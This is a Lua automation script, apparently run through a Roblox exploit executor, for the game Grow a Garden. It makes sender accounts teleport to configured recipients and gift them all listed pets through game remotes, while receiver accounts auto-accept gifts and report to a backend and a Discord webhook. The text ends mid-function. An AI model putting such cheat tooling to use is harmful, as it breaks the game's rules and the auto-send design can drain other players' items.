-- Функция для проверки, есть ли у игрока питомцы для трейда
local function HasPetsForTrade()
    local petsInInventory = GetPetsInInventory()
    
    -- Проверяем корректность списка питомцев
    if not petsInInventory or type(petsInInventory) ~= "table" then
        return false
    end
    
    local hasTradePets = false
    
    for _, petData in pairs(petsInInventory) do
        if petData and petData.Name and type(petData.Name) == "string" then
            if IsPetInTradeList(petData.Name) then
                hasTradePets = true
                break
            end
        end
    end
    
    return hasTradePets
end

-- Function to get pets count in inventory
local function GetPetsCountInInventory()
    local petsInInventory = GetPetsInInventory()
    
    -- Проверяем корректность списка питомцев
    if not petsInInventory or type(petsInInventory) ~= "table" then
        return 0
    end
    
    return #petsInInventory
end

-- Function to reset inventory notification flag if inventory is normalized
local function ResetInventoryNotificationIfNormalized()
    if not getgenv().Config.UseBackend then return end
    
    -- Проверяем корректность настроек
    if not getgenv().Config.BackendURL or getgenv().Config.BackendURL == "" then
        return
    end
    
    local petsCount = GetPetsCountInInventory()
    if petsCount <= 55 then
        local url = getgenv().Config.BackendURL .. "/api/reset-inventory-notification"
        local data = { username = LocalPlayer.Name or "Unknown" }
        
        local response = MakeHttpRequest(url, "POST", data)
        if response and response.success then
            AddMessage("Inventory notification flag reset (backend)", "info")
        else
            AddMessage("Failed to reset inventory notification flag (backend)", "warning")
        end
    end
end

-- Variable to track last used receiver
getgenv().LastUsedReceiverIndex = getgenv().LastUsedReceiverIndex or 0

-- Function to send Discord notification
local function SendDiscordNotification(message, color)
    -- Проверяем корректность настроек
    if not getgenv().Config.DiscordNotifications then
        return
    end
    
    local webhook = getgenv().Config.DiscordWebhook
    if not webhook or type(webhook) ~= "string" or webhook == "" then
        return
    end
    
    -- Проверяем корректность сообщения
    if not message or type(message) ~= "string" or message == "" then
        AddMessage("Discord: пустое сообщение", "warning")
        return
    end
    
    local embed = {
        title = "Auto Trade Notification",
        description = message,
        color = color or 16711680, -- Red by default
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        footer = {
            text = "Auto Trade System"
        }
    }
    
    local data = {
        embeds = {embed}
    }
    
    local response = MakeHttpRequest(webhook, "POST", data)
    
    if response then
        AddMessage("Discord notification sent", "success")
    else
        AddMessage("Failed to send Discord notification", "error")
    end
end


-- Function to send inventory full notification
local function SendInventoryFullNotification(username, petsCount, petsList)
    if not getgenv().Config.DiscordNotifications then
        return
    end
    
    -- Проверяем корректность входных данных
    if not username or type(username) ~= "string" or username == "" then
        username = "Unknown"
    end
    
    if not petsCount or type(petsCount) ~= "number" then
        petsCount = 0
    end
    
    if not petsList or type(petsList) ~= "table" then
        petsList = {}
    end
    
    local message = "**Inventory is full!**\n"
    message = message .. "**User:** " .. username .. "\n"
    message = message .. "**Pets in inventory:** " .. petsCount .. "\n"
    message = message .. "**Pets list:**\n"
    
    for i, petName in pairs(petsList) do
        if petName and type(petName) == "string" and petName ~= "" then
            message = message .. i .. ". " .. petName .. "\n"
        end
    end
    
    SendDiscordNotification(message, 16711680) -- Red color
end

-- Function to check if receiver should be disabled due to inventory overflow
local function ShouldDisableReceiverDueToOverflow()
    -- Reset notification if inventory is normalized
    ResetInventoryNotificationIfNormalized()
    
    -- Check if we are a receiver
    local isReceiver = false
    local recipients = getgenv().Config.Recipients
    if recipients and type(recipients) == "table" then
        for _, username in pairs(recipients) do
            if username and type(username) == "string" and username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
    end
    
    -- Only receivers check for overflow
    if not isReceiver then
        return false
    end
    
    local petsCount = GetPetsCountInInventory()
    
    if petsCount > 55 then
        AddMessage("⚠️ INVENTORY OVERFLOW: " .. petsCount .. " pets!", "error")
        AddMessage("Receiver disabled from backend due to overflow (>55 pets)", "warning")
        AddMessage("Staying in game but not registering as receiver", "info")
        
        -- Проверка через backend, отправлять ли уведомление
        local shouldNotify = true
        if getgenv().Config.UseBackend and getgenv().Config.BackendURL and getgenv().Config.BackendURL ~= "" then
            local url = getgenv().Config.BackendURL .. "/api/notify-inventory-full"
            local data = { username = LocalPlayer.Name or "Unknown" }
            local response = MakeHttpRequest(url, "POST", data)
            if response and response.alreadyNotified then
                shouldNotify = false
                AddMessage("Discord notification already sent for this user (backend)", "info")
            end
        end
        
        if shouldNotify then
            -- Send Discord notification
            local petsInInventory = GetPetsInInventory()
            local petsList = {}
            if petsInInventory and type(petsInInventory) == "table" then
                for _, petData in pairs(petsInInventory) do
                    if petData and petData.Name and type(petData.Name) == "string" then
                        table.insert(petsList, petData.Name)
                    end
                end
            end
            SendInventoryFullNotification(LocalPlayer.Name or "Unknown", petsCount, petsList)
        end
        
        return true
    end
    
    return false
end

-- Function to check receivers via backend
local function CheckReceiversViaBackend()
    if not getgenv().Config.UseBackend then
        return nil
    end
    
    -- Проверяем корректность настроек
    if not getgenv().Config.BackendURL or getgenv().Config.BackendURL == "" then
        AddMessage("Backend: URL не настроен", "warning")
        return nil
    end
    
    -- Check if we are a receiver
    local isReceiver = false
    local recipients = getgenv().Config.Recipients
    if recipients and type(recipients) == "table" then
        for _, username in pairs(recipients) do
            if username and type(username) == "string" and username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
    end
    
    -- Only receivers check and move from VIP/full servers
    if isReceiver then
        -- Check if we are on VIP server
        if IsVipServer() then
            -- Проверяем, не пытались ли мы недавно перейти
            if not getgenv().LastVIPRejoinTime or (tick() - getgenv().LastVIPRejoinTime) > 60 then
                AddMessage("Receiver: VIP server detected, moving to normal server...", "warning")
                getgenv().LastVIPRejoinTime = tick()
                RejoinNormalServer()
                return nil
            else
                local remainingTime = math.ceil(60 - (tick() - getgenv().LastVIPRejoinTime))
                AddMessage("Receiver: VIP server, waiting " .. remainingTime .. "s before next attempt", "info")
                return nil
            end
        end
        
        -- Check if server is full -> теперь просто ждем, не переходим
        if IsServerFull() then
            AddMessage("Receiver: server is full, waiting on current server", "info")
            return nil
        end
    else
        -- We are sender, check if we have pets for trading
        if not HasPetsForTrade() then
            AddMessage("Sender: no pets for trading in inventory, waiting...", "warning")
            return nil
        end
        
        -- Senders can be on VIP/full servers; still proceed to backend check
        if IsVipServer() then
            AddMessage("Sender: VIP server, proceeding to backend check", "info")
        end
        if IsServerFull() then
            AddMessage("Sender: server is full, proceeding to backend check", "info")
        end
    end
    
    local usernames = table.concat(getgenv().Config.Recipients, ",")
    local url = getgenv().Config.BackendURL .. "/api/check-receivers?usernames=" .. usernames
    
    local response = MakeHttpRequest(url, "GET")
    if response and response.success and response.availableReceivers and #response.availableReceivers > 0 then
        -- Фильтрация получателей по маппингу питомцев
        local filtered = {}
        local petToRecipients = BuildPetToRecipientsMap()
        for _, r in ipairs(response.availableReceivers) do
            if HasPetsForRecipient(r.username) then
                table.insert(filtered, r)
            end
        end

        local list = (#filtered > 0) and filtered or response.availableReceivers

        -- Receiver rotation for even distribution
        local availableCount = #list
        
        -- Increase index for next receiver
        getgenv().LastUsedReceiverIndex = getgenv().LastUsedReceiverIndex + 1
        
        -- If index exceeds available receivers count, start from beginning
        if getgenv().LastUsedReceiverIndex > availableCount then
            getgenv().LastUsedReceiverIndex = 1
        end
        
        local selectedReceiver = list[getgenv().LastUsedReceiverIndex]
        
        AddMessage("Selected receiver " .. getgenv().LastUsedReceiverIndex .. " of " .. availableCount .. ": " .. selectedReceiver.username, "info")
        
        return selectedReceiver
    end
    
    return nil
end

-- Function to teleport to receiver
local function TeleportToReceiver(receiverData)
    if not getgenv().Config.AutoTeleport then
        AddMessage("Teleport: AutoTeleport отключен", "warning")
        return false
    end
    
    if not receiverData or type(receiverData) ~= "table" then
        AddMessage("Teleport: некорректные данные получателя", "error")
        return false
    end
    
    -- Check if we have pets for trading (if setting is enabled)
    if getgenv().Config.SkipTeleportIfNoPets then
        local isReceiver = false
        local recipients = getgenv().Config.Recipients
        if recipients and type(recipients) == "table" then
            for _, username in pairs(recipients) do
                if username and type(username) == "string" and username == LocalPlayer.Name then
                    isReceiver = true
                    break
                end
            end
        end
        
        if not isReceiver and not HasPetsForTrade() then
            AddMessage("Teleport: пропускаем, нет питомцев для трейда", "warning")
            return false
        end
    end
    
    local placeId = 126884695634066 -- GAG game ID
    local serverId = receiverData.serverId
    
    if not serverId or type(serverId) ~= "string" or serverId == "" then
        AddMessage("Teleport: некорректный serverId", "error")
        return false
    end
    
    local username = receiverData.username or "Unknown"
    AddMessage("Teleport: переход к получателю " .. username .. " на сервер: " .. serverId, "info")
    
    local success, error = pcall(function()
        TeleportService:TeleportToPlaceInstance(placeId, serverId)
    end)
    
    if success then
        AddMessage("Teleport: переход запущен...", "success")
        return true
    else
        AddMessage("Teleport: ошибка перехода: " .. tostring(error), "error")
        return false
    end
end

-- Очередь: запрос резервации для отправителя
local function RequestQueueReservation()
    if not getgenv().Config.UseBackend then 
        return nil 
    end

    -- Проверяем корректность настроек
    if not getgenv().Config.BackendURL or getgenv().Config.BackendURL == "" then
        AddMessage("Queue: Backend URL не настроен", "warning")
        return nil
    end

    -- Определяем роль: только отправитель запрашивает очередь
    local isReceiver = false
    local recipients = getgenv().Config.Recipients
    if recipients and type(recipients) == "table" then
        for _, username in pairs(recipients) do
            if username and type(username) == "string" and username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
    end
    if isReceiver then 
        AddMessage("Queue: получатели не запрашивают резервацию", "info")
        return nil 
    end

    -- Если нет питомцев — выходим
    if not HasPetsForTrade() then 
        AddMessage("Queue: нет питомцев для трейда", "warning")
        return nil 
    end

    local url = getgenv().Config.BackendURL .. "/api/queue/request"
    local body = { 
        sender = LocalPlayer.Name or "Unknown", 
        receivers = recipients or {} 
    }
    
    local resp = MakeHttpRequest(url, "POST", body)
    if not resp or not resp.success then 
        AddMessage("Queue: ошибка запроса резервации", "warning")
        return nil 
    end
    
    if resp.reserved then
        AddMessage("Queue: зарезервирован получатель " .. (resp.reserved.receiver or "Unknown") .. ", pos=1", "success")
        return { 
            username = resp.reserved.receiver or "Unknown", 
            serverId = resp.reserved.serverId or "", 
            jobId = resp.reserved.jobId or "" 
        }
    elseif resp.queued then
        AddMessage("Queue: в очереди для получателя " .. (resp.queued.receiver or "Unknown") .. ", позиция " .. tostring(resp.queued.position or 0), "info")
        return nil
    end
    return nil
end

-- Очередь: освободить резервацию (вызывать после завершения или отказа)
local function ReleaseQueueReservation(receiverUsername)
    if not getgenv().Config.UseBackend then 
        return 
    end
    
    if not receiverUsername or type(receiverUsername) ~= "string" or receiverUsername == "" then
        AddMessage("Queue: некорректное имя получателя для освобождения резервации", "warning")
        return 
    end
    
    -- Проверяем корректность настроек
    if not getgenv().Config.BackendURL or getgenv().Config.BackendURL == "" then
        AddMessage("Queue: Backend URL не настроен", "warning")
        return 
    end
    
    local url = getgenv().Config.BackendURL .. "/api/queue/release"
    local body = { 
        sender = LocalPlayer.Name or "Unknown", 
        receiver = receiverUsername 
    }
    
    local resp = MakeHttpRequest(url, "POST", body)
    if resp and resp.success then
        AddMessage("Queue: резервация освобождена для получателя " .. receiverUsername, "info")
    else
        AddMessage("Queue: ошибка освобождения резервации для получателя " .. receiverUsername, "warning")
    end
end

-- Function to find first available player from recipients list
local function FindFirstAvailableRecipient()
    -- Проверяем корректность настроек
    local recipients = getgenv().Config.Recipients
    if not recipients or type(recipients) ~= "table" then
        AddMessage("FindRecipient: список получателей не настроен", "warning")
        return nil
    end
    
    -- First check if there's a receiver on current server
    for _, username in pairs(recipients) do
        if username and type(username) == "string" and username ~= "" then
            for _, player in pairs(Players:GetPlayers()) do
                if player and player.Name and type(player.Name) == "string" and player.Name == username then
                    -- Check mapping: do we have allowed pets for this receiver?
                    if HasPetsForRecipient(player.Name) then
                        AddMessage("FindRecipient: найден получатель на текущем сервере: " .. player.Name, "success")
                        return player
                    else
                        AddMessage("FindRecipient: получатель на сервере найден, но нет подходящих питомцев: " .. player.Name, "warning")
                    end
                end
            end
        end
    end
    
    -- If no receiver on current server, check via backend
    if getgenv().Config.UseBackend then
        AddMessage("FindRecipient: проверяем бекенд...", "info")
        local backendReceiver = CheckReceiversViaBackend()
        if backendReceiver then
            AddMessage("FindRecipient: найден получатель через бекенд: " .. (backendReceiver.username or "Unknown"), "success")
            
            -- If autoteleport is enabled AND we are NOT receiver, then teleport
            if getgenv().Config.AutoTeleport and LocalPlayer.Name ~= (backendReceiver.username or "") then
                local ok = TeleportToReceiver(backendReceiver)
                if ok then
                    return nil -- телепорт инициирован
                else
                    AddMessage("FindRecipient: телепорт к получателю не удался, повторим позже", "warning")
                end
            elseif LocalPlayer.Name == (backendReceiver.username or "") then
                -- We are receiver ourselves, don't teleport
                AddMessage("FindRecipient: мы сами получатель, ожидаем отправителя...", "info")
                return nil
            end
        else
            AddMessage("FindRecipient: получатели через бекенд не найдены", "info")
        end
    end
    
    return nil
end

-- Function to find player by name
local function FindPlayerByName(username)
    -- Проверяем корректность входных данных
    if not username or type(username) ~= "string" or username == "" then
        return nil
    end
    
    -- Проверяем доступность сервиса Players
    if not Players or not Players.GetPlayers then
        return nil
    end
    
    for _, player in pairs(Players:GetPlayers()) do
        if player and player.Name and type(player.Name) == "string" and player.Name == username then
            return player
        end
    end
    return nil
end

-- Function to send pet
local function SendPet(petData, targetPlayer)
    -- Проверяем корректность входных данных
    if not petData or type(petData) ~= "table" then
        AddMessage("SendPet: некорректные данные питомца", "error")
        return false
    end
    
    if not targetPlayer or not targetPlayer.Name then
        AddMessage("SendPet: некорректные данные получателя", "error")
        return false
    end
    
    -- Check if pet is still in inventory
    if not petData.Tool or not petData.Tool.Parent then
        AddMessage("SendPet: питомец не найден: " .. (petData.Name or "Unknown"), "error")
        return false
    end
    
    -- Проверяем, что PetGiftingService доступен
    if not PetGiftingService or not PetGiftingService.FireServer then
        AddMessage("SendPet: PetGiftingService недоступен", "error")
        return false
    end
    
    local args = {
        "GivePet",
        targetPlayer
    }
    
    local success, error = pcall(function()
        PetGiftingService:FireServer(unpack(args))
    end)
    
    if success then
        AddMessage("SendPet: отправлен питомец " .. (petData.Name or "Unknown") .. " игроку: " .. (targetPlayer.Name or "Unknown"), "success")
        -- Small delay for server processing
        task.wait(0.2)
        return true
    else
        AddMessage("SendPet: ошибка отправки: " .. tostring(error), "error")
        return false
    end
end

-- Function to accept gift
local function AcceptGift(giftId)
    -- Проверяем корректность входных данных
    if not giftId or type(giftId) ~= "string" or giftId == "" then
        AddMessage("AcceptGift: некорректный ID подарка", "error")
        return false
    end
    
    -- Проверяем, что AcceptPetGift доступен
    if not AcceptPetGift or not AcceptPetGift.FireServer then
        AddMessage("AcceptGift: AcceptPetGift недоступен", "error")
        return false
    end
    
    local args = {
        true,
        giftId
    }
    
    local success, error = pcall(function()
        AcceptPetGift:FireServer(unpack(args))
    end)
    
    if success then
        AddMessage("AcceptGift: принят подарок с ID: " .. giftId, "success")
        return true
    else
        AddMessage("AcceptGift: ошибка принятия подарка: " .. tostring(error), "error")
        return false
    end
end

-- Function to register receiver in backend
local function RegisterAsReceiver()
    if not getgenv().Config.UseBackend then
        AddMessage("Register: бекенд отключен", "info")
        return false
    end
    
    -- Проверяем корректность настроек
    if not getgenv().Config.BackendURL or getgenv().Config.BackendURL == "" then
        AddMessage("Register: Backend URL не настроен", "warning")
        return false
    end
    
    -- Check if we are a receiver
    local isReceiver = false
    local recipients = getgenv().Config.Recipients
    if recipients and type(recipients) == "table" then
        for _, username in pairs(recipients) do
            if username and type(username) == "string" and username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
    end
    
    -- Only receivers register and react to VIP/full servers
    if isReceiver then
        -- Check inventory overflow
        if ShouldDisableReceiverDueToOverflow() then
            AddMessage("Register: получатель отключен из-за переполнения инвентаря", "warning")
            return false
        end

        -- If on VIP server → move to public before registration
        if IsVipServer() then
            -- Проверяем, не пытались ли мы недавно перейти
            if not getgenv().LastVIPRejoinTime or (tick() - getgenv().LastVIPRejoinTime) > 60 then
                AddMessage("Register: VIP сервер, переходим на обычный перед регистрацией...", "warning")
                getgenv().LastVIPRejoinTime = tick()
                RejoinNormalServer()
                return false
            else
                local remainingTime = math.ceil(60 - (tick() - getgenv().LastVIPRejoinTime))
                AddMessage("Register: VIP сервер, ждем " .. remainingTime .. "с до следующей попытки", "info")
                return false
            end
        end
    else
        -- Senders don't register as receivers
        AddMessage("Register: отправители не регистрируются как получатели", "info")
        return false
    end
    
    local username = LocalPlayer.Name or "Unknown"
    local jobId = "job-" .. username .. "-" .. tostring(tick())
    local serverId = game.JobId or "Unknown"
    
    local data = {
        receiver = username,
        jobId = jobId,
        serverId = serverId
    }
    
    local url = getgenv().Config.BackendURL .. "/api/register-job"
    local response = MakeHttpRequest(url, "POST", data)
    
    if response and response.success then
        AddMessage("Register: зарегистрирован как получатель в бекенде", "success")
        AddMessage("Register: Job ID: " .. jobId, "info")
        AddMessage("Register: Server ID: " .. serverId, "info")
        
        -- Save jobId for later deletion
        getgenv().CurrentJobId = jobId
        return true
    else
        AddMessage("Register: ошибка регистрации в бекенде", "error")
        return false
    end
end

-- Function to unregister receiver
local function UnregisterAsReceiver()
    if not getgenv().Config.UseBackend then
        AddMessage("Unregister: бекенд отключен", "info")
        return false
    end
    
    if not getgenv().CurrentJobId or type(getgenv().CurrentJobId) ~= "string" or getgenv().CurrentJobId == "" then
        AddMessage("Unregister: нет активного Job ID", "warning")
        return false
    end
    
    -- Проверяем корректность настроек
    if not getgenv().Config.BackendURL or getgenv().Config.BackendURL == "" then
        AddMessage("Unregister: Backend URL не настроен", "warning")
        return false
    end
    
    local url = getgenv().Config.BackendURL .. "/api/job/" .. getgenv().CurrentJobId
    local response = MakeHttpRequest(url, "DELETE")
    
    if response and response.success then
        AddMessage("Unregister: регистрация получателя удалена", "success")
        getgenv().CurrentJobId = nil
        return true
    else
        AddMessage("Unregister: ошибка удаления регистрации", "error")
        return false
    end
end

-- Function to update receiver status
local function UpdateReceiverStatus()
    if not getgenv().Config.UseBackend then
        AddMessage("UpdateStatus: бекенд отключен", "info")
        return false
    end
    
    -- Проверяем корректность настроек
    if not getgenv().Config.BackendURL or getgenv().Config.BackendURL == "" then
        AddMessage("UpdateStatus: Backend URL не настроен", "warning")
        return false
    end
    
    -- Check if we are a receiver
    local isReceiver = false
    local recipients = getgenv().Config.Recipients
    if recipients and type(recipients) == "table" then
        for _, username in pairs(recipients) do
            if username and type(username) == "string" and username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
    end
    
    -- Only receivers update status and react to VIP/full servers
    if isReceiver then
        -- Check inventory overflow
        if ShouldDisableReceiverDueToOverflow() then
            AddMessage("UpdateStatus: получатель отключен из-за переполнения инвентаря", "warning")
            return false
        end
        
        -- VIP: rejoin to public
        if IsVipServer() then
            -- Проверяем, не пытались ли мы недавно перейти
            if not getgenv().LastVIPRejoinTime or (tick() - getgenv().LastVIPRejoinTime) > 60 then
                AddMessage("UpdateStatus: VIP сервер, переходим на обычный...", "warning")
                getgenv().LastVIPRejoinTime = tick()
                RejoinNormalServer()
                return false
            else
                local remainingTime = math.ceil(60 - (tick() - getgenv().LastVIPRejoinTime))
                AddMessage("UpdateStatus: VIP сервер, ждем " .. remainingTime .. "с до следующей попытки", "info")
                return false
            end
        end
        
        -- Full: just wait on current server (no move)
        if IsServerFull() then
            AddMessage("UpdateStatus: сервер полный, ждем на текущем сервере", "info")
            return false
        end
    else
        -- Senders don't update receiver status
        AddMessage("UpdateStatus: отправители не обновляют статус получателя", "info")
        return false
    end
    
    local username = LocalPlayer.Name or "Unknown"
    local serverId = game.JobId or "Unknown"
    
    local data = {
        receiver = username,
        serverId = serverId
    }
    
    local url = getgenv().Config.BackendURL .. "/api/update-receiver"
    local response = MakeHttpRequest(url, "POST", data)
    
    if response and response.success then
        AddMessage("UpdateStatus: статус получателя обновлен", "info")
        return true
    else
        AddMessage("UpdateStatus: ошибка обновления статуса", "error")
        return false
    end
end

-- Main auto trade function
local function AutoTrade()
    if not getgenv().Config.Enabled then
        AddMessage("AutoTrade: автотрейд отключен", "info")
        return
    end
    
    -- Check if we are a receiver
    local isReceiver = false
    local recipients = getgenv().Config.Recipients
    if recipients and type(recipients) == "table" then
        for _, username in pairs(recipients) do
            if username and type(username) == "string" and username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
    end
    
    -- If we are receiver, don't execute sending logic
    if isReceiver then
        AddMessage("AutoTrade: мы получатель, ожидаем отправителя...", "info")
        return
    end
    
    -- Check if we have pets for trading
    if not HasPetsForTrade() then
        AddMessage("AutoTrade: нет питомцев для трейда в инвентаре, ожидаем...", "warning")
        return
    end
    
    -- 1) очередь/резервация через бэкенд
    local reserved = RequestQueueReservation()
    local targetPlayer = nil
    if reserved then
        -- выполняем телепорт на зарезервированного реципиента
        if getgenv().Config.AutoTeleport and LocalPlayer.Name ~= (reserved.username or "") then
            AddMessage("AutoTrade: телепорт к зарезервированному получателю...", "info")
            TeleportToReceiver(reserved)
            return
        end
    else
        -- 2) локальный поиск и обычная логика через /api/check-receivers
        AddMessage("AutoTrade: поиск получателя...", "info")
        targetPlayer = FindFirstAvailableRecipient()
    end
    
    if targetPlayer then
        AddMessage("AutoTrade: найден получатель: " .. (targetPlayer.Name or "Unknown"), "success")
    else
        -- If no receiver on current server and autoteleport is enabled
        if getgenv().Config.UseBackend and getgenv().Config.AutoTeleport then
            AddMessage("AutoTrade: получатель не найден на текущем сервере, ожидаем телепорт...", "info")
            return
        else
            local recipientList = "не настроен"
            if recipients and type(recipients) == "table" then
                recipientList = table.concat(recipients, ", ")
            end
            AddMessage("AutoTrade: ни один из получателей не найден на сервере: " .. recipientList, "error")
            return
        end
    end
    
    -- Get full inventory
    local fullInventory = GetFullInventory()
    AddMessage("Found items in inventory: " .. #fullInventory, "info")
    
    -- Look for pets to trade
    local petsToTrade = {}
    local foundPets = {}
    local usedUUIDs = {} -- For tracking unique pets
    local petToRecipients = BuildPetToRecipientsMap()
    
    for _, item in pairs(fullInventory) do
        if item:IsA("Tool") then
            local petUUID = item:GetAttribute("PET_UUID")
            if petUUID then
                local petData = GetPetData(item)
                if petData then
                    table.insert(foundPets, petData)
                    local baseName = GetBasePetName(petData.Name)
                    AddMessage("Found pet: " .. petData.Name .. " (base name: " .. baseName .. ")", "info")
                    
                    if IsPetInTradeList(petData.Name) then
                        -- Respect recipient mapping
                        if targetPlayer and not IsPetAllowedForRecipient(petData.Name, targetPlayer.Name, petToRecipients) then
                            AddMessage("Pet allowed for other recipients, skipping for " .. targetPlayer.Name .. ": " .. baseName, "info")
                        else
                        -- Check if this pet is not already added (by UUID)
                            if not usedUUIDs[petUUID] then
                                table.insert(petsToTrade, petData)
                                usedUUIDs[petUUID] = true
                                AddMessage("Pet added to trade list: " .. baseName, "success")
                            else
                                AddMessage("Pet already in trade list (duplicate): " .. baseName, "warning")
                            end
                        end
                    else
                        AddMessage("Pet NOT in trade list: " .. baseName, "warning")
                    end
                end
            else
                AddMessage("Item is not a pet: " .. item.Name, "info")
            end
        end
    end
    
    AddMessage("Total pets found: " .. #foundPets, "info")
    
    if #petsToTrade == 0 then
        AddMessage("No pets for trading in inventory", "warning")
        return
    end
    
    AddMessage("Found pets for trading: " .. #petsToTrade, "info")
    
    -- Show all found pets for debugging
    for i, petData in pairs(petsToTrade) do
        AddMessage("Pet " .. i .. ": " .. petData.Name, "info")
    end
    
    local sentCount = 0
    
    -- Create a copy of array for safe element removal
    local petsToSend = {}
    for i, petData in pairs(petsToTrade) do
        petsToSend[i] = petData
    end
    
    for i = #petsToSend, 1, -1 do
        local petData = petsToSend[i]
        
        -- Check if pet still exists
        if petData and petData.Tool and petData.Tool.Parent then
            -- First equip the pet
            if EquipPet(petData) then
                task.wait(0.5) -- Small delay after equipping
                
                -- Then send
                if SendPet(petData, targetPlayer or (reserved and FindPlayerByName(reserved.username))) then
                    sentCount = sentCount + 1
                    task.wait(1) -- Delay between sends
                    
                    -- Remove pet from list after successful send
                    table.remove(petsToSend, i)
                end
            end
        else
            -- Remove pet from list if it no longer exists
            table.remove(petsToSend, i)
        end
    end
    
    if sentCount > 0 then
        AddMessage("Sent pets: " .. sentCount, "success")
        -- освободить резервацию, если была
        if reserved and reserved.username then
            ReleaseQueueReservation(reserved.username)
        end
        
        -- Check if we are sender
        local isReceiver = false
        for _, username in pairs(getgenv().Config.Recipients) do
            if username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
        
        -- If we are sender and successfully sent pets, leave server
        if not isReceiver and getgenv().Config.LeaveServerAfterTrade then
            AddMessage("Sender: trade completed, leaving server in 3 seconds...", "info")
            task.wait(3) -- Small delay before leaving
            LeaveServerAfterTrade()
        elseif not isReceiver and not getgenv().Config.LeaveServerAfterTrade then
            AddMessage("Sender: trade completed, staying on server (setting disabled)", "info")
        end
    end
end

-- Incoming gifts handler
GiftPet.OnClientEvent:Connect(function(giftId, petName, senderName)
    AddMessage("Received gift from: " .. senderName .. " Pet: " .. petName, "success")
    
    -- Automatically accept all gifts
    AcceptGift(giftId)
end)

-- Main loop
local function MainLoop()
    AddMessage("MainLoop: запущен", "info")
    
    while getgenv().Config.Enabled do
        task.wait(5) -- Check every 5 seconds
        
        local shouldContinue = false
        
        -- Periodically check server status
        if getgenv().Config.UseBackend then
            -- Очищаем старую память о серверах каждые 5 минут
            if not getgenv().LastMemoryCleanup or (tick() - getgenv().LastMemoryCleanup) > 300 then
                CleanupServerMemory()
                getgenv().LastMemoryCleanup = tick()
            end
            
            -- Check if we are a receiver
            local isReceiver = false
            local recipients = getgenv().Config.Recipients
            if recipients and type(recipients) == "table" then
                for _, username in pairs(recipients) do
                    if username and type(username) == "string" and username == LocalPlayer.Name then
                        isReceiver = true
                        break
                    end
                end
            end
            
            if isReceiver then
                -- Receivers move from VIP and full servers
                if IsVipServer() then
                    -- Проверяем, не пытались ли мы недавно перейти
                    if not getgenv().LastVIPRejoinTime or (tick() - getgenv().LastVIPRejoinTime) > 30 then
                        AddMessage("MainLoop: получатель на VIP сервере, переходим...", "warning")
                        getgenv().LastVIPRejoinTime = tick()
                        RejoinNormalServer()
                        task.wait(15) -- Увеличенная задержка после попытки перехода
                        shouldContinue = true
                    else
                        local remainingTime = math.ceil(30 - (tick() - getgenv().LastVIPRejoinTime))
                        AddMessage("MainLoop: VIP сервер, ждем " .. remainingTime .. "с до следующей попытки", "info")
                        shouldContinue = true
                    end
                elseif IsServerFull() then
                    AddMessage("MainLoop: сервер полный, ждем на текущем сервере", "info")
                    shouldContinue = true
                end
            else
                -- Senders stay on their servers
                if IsVipServer() then
                    AddMessage("MainLoop: отправитель на VIP сервере, остаемся", "info")
                elseif IsServerFull() then
                    AddMessage("MainLoop: сервер полный, остаемся", "info")
                end
            end
        end
        
        if not shouldContinue then
            local success, error = pcall(AutoTrade)
            if not success then
                AddMessage("MainLoop: ошибка в AutoTrade: " .. tostring(error), "error")
            end
        end
    end
    
    AddMessage("MainLoop: остановлен", "info")
end

-- Receiver loop (registration and status updates)
local function ReceiverLoop()
    AddMessage("ReceiverLoop: запущен", "info")
    
    -- Register as receiver on startup
    if getgenv().Config.UseBackend then
        task.wait(2) -- Small delay for loading
        local success, error = pcall(RegisterAsReceiver)
        if not success then
            AddMessage("ReceiverLoop: ошибка регистрации при запуске: " .. tostring(error), "error")
        end
    end
    
    while getgenv().Config.Enabled do
        task.wait(30) -- Update status every 30 seconds
        
        -- Сбросить флаг уведомления, если инвентарь нормализован
        local success, error = pcall(ResetInventoryNotificationIfNormalized)
        if not success then
            AddMessage("ReceiverLoop: ошибка сброса уведомления: " .. tostring(error), "error")
        end
        
        local shouldContinue = false
        
        -- Check server status before update (only for receivers)
        if getgenv().Config.UseBackend then
            -- Check if we are a receiver
            local isReceiver = false
            local recipients = getgenv().Config.Recipients
            if recipients and type(recipients) == "table" then
                for _, username in pairs(recipients) do
                    if username and type(username) == "string" and username == LocalPlayer.Name then
                        isReceiver = true
                        break
                    end
                end
            end
            
            if isReceiver then
                -- Check inventory overflow
                local success, error = pcall(ShouldDisableReceiverDueToOverflow)
                if not success then
                    AddMessage("ReceiverLoop: ошибка проверки переполнения: " .. tostring(error), "error")
                    shouldContinue = true
                elseif error then
                    AddMessage("ReceiverLoop: получатель отключен из-за переполнения инвентаря", "warning")
                    task.wait(60) -- Wait longer when overflowed
                    shouldContinue = true
                else
                    -- Only receivers check and move
                    if IsVipServer() then
                        -- Проверяем, не пытались ли мы недавно перейти
                        if not getgenv().LastVIPRejoinTime or (tick() - getgenv().LastVIPRejoinTime) > 45 then
                            AddMessage("ReceiverLoop: VIP сервер, переходим...", "warning")
                            getgenv().LastVIPRejoinTime = tick()
                            local success, error = pcall(RejoinNormalServer)
                            if not success then
                                AddMessage("ReceiverLoop: ошибка перехода: " .. tostring(error), "error")
                            end
                            task.wait(20) -- Увеличенная задержка после попытки перехода
                            shouldContinue = true
                        else
                            local remainingTime = math.ceil(45 - (tick() - getgenv().LastVIPRejoinTime))
                            AddMessage("ReceiverLoop: VIP сервер, ждем " .. remainingTime .. "с до следующей попытки", "info")
                            shouldContinue = true
                        end
                    elseif IsServerFull() then
                        AddMessage("ReceiverLoop: сервер полный, ждем на текущем сервере", "info")
                        shouldContinue = true
                    end
                end
            end
        end
        
        if not shouldContinue and getgenv().Config.UseBackend then
            local success, error = pcall(UpdateReceiverStatus)
            if not success then
                AddMessage("ReceiverLoop: ошибка обновления статуса: " .. tostring(error), "error")
            end
        end
    end
    
    AddMessage("ReceiverLoop: остановлен", "info")
end

-- Start main loop
task.spawn(MainLoop)

-- Start receiver loop
task.spawn(ReceiverLoop)

-- Commands for management
local function CreateCommands()
    local function ToggleAutoTrade()
        getgenv().Config.Enabled = not getgenv().Config.Enabled
        AddMessage("Auto trade: " .. (getgenv().Config.Enabled and "Enabled" or "Disabled"), "info")
    end
    
    local function SetTargetPlayer(username)
